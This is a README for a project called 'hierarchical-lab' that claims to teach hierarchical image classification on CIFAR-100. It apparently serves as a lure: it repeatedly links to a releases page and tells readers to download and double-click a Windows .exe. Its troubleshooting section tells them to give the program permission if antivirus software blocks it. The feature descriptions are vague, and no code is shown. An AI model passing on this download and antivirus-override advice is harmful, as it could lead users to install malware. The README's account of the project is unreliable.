# 🧪 hierarchical-lab - Learn structured classification with simple steps

[![Download hierarchical-lab](https://img.shields.io/badge/Download-Hierarchical_Lab-blue.svg)](https://github.com/Ostrichfernwithdrawalsymptom190/hierarchical-lab/releases)

This application provides a hands-on way to learn about hierarchical classification using the CIFAR-100 dataset. It uses structured models that group data into coarse and fine categories. You can explore how deep learning models handle complex label structures and loss functions.

## 📥 Getting Started

The software helps you understand how neural networks classify images by looking at broad categories, such as "vehicles," and then specific sub-categories, such as "bicycles" or "trucks." This process mimics the way humans categorize the world.

To download the application, visit the link below:

[Click here to open the download page](https://github.com/Ostrichfernwithdrawalsymptom190/hierarchical-lab/releases)

Look for the latest release on that page. Download the file that ends in .exe for Windows. Once the download finishes, open the folder where you saved the file and double-click it to start the program.

## 💻 System Requirements

Your computer needs a few things to run this machine learning tool smoothly.

You should have at least 8GB of RAM. If you have a dedicated graphics card from NVIDIA or AMD, the application will run faster. Even without a powerful graphics card, the program will complete the examples using your main processor.

Ensure you have at least 2GB of free space on your hard drive. This stores the CIFAR-100 dataset files and the pre-computed model weights.

## 🛠 Features

The application includes several tools to help you investigate image classification:

- Interactive visualization of label structures.
- Tools to test how different loss functions affect model accuracy.
- A dashboard that shows how the neural network learns coarse categories before fine ones.
- Settings to adjust the depth of the classification tree.

These features allow you to see the difference between traditional flat classification and hierarchical methods. You gain insight into why structured prediction matters for large datasets.

## ❓ How to Use the Program

When you launch the program for the first time, you see a main menu. Follow these steps to begin your first experiment:

1. Select "Load Dataset" from the top menu. The program automatically downloads the CIFAR-100 data if it is not already present.
2. Choose a pre-trained model from the "Model Selection" tab.
3. Click "Start Analysis" to see how the model categorizes test images.
4. Use the slider to increase or decrease the complexity of the hierarchical tree.
5. Watch the graph update in real-time as the model calculates the loss.

If you want to look at a specific group of images, use the search bar. Type a category name like "flowers" to filter the images the tool processes.

## 📈 Understanding the Results

The program displays a confusion matrix. This grid highlights where the model makes mistakes. For instance, you might see that the model confuses "palm trees" with "maples" but rarely confuses them with "bicycles." 

The loss function interface shows how the model corrects its own errors. In this program, you can observe a special technique that turns non-differentiable labels into a format the math behind the neural network can understand. This process improves how well the model guesses the right category.

## ⚙️ Troubleshooting

If the program fails to start, check the following items:

- Ensure you have the latest drivers for your graphics card.
- If you see an error about missing files, try running the installer again.
- Sometimes, third-party antivirus software blocks the application. Make sure the application has permission to run.
- Close other demanding programs, such as video editors or games, to free up memory for the classification process.

If you encounter issues during long training sessions, look at the "Log" tab at the bottom of the window. This shows text details about what the program is doing and reports any specific technical errors.

## 📚 Educational Value

This tool serves as an educational guide. By interacting with the layers of the model, you learn the difference between standard machine learning and hierarchical learning. The application clarifies how loss functions guide the learning process. These concepts are foundational for modern computer vision and help you understand how autonomous systems identify objects.

Keywords: cifar100, computer-vision, deep-learning, hierarchical-classification, learning-resources, loss-functions, machine-learning, mps, pytorch, structured-prediction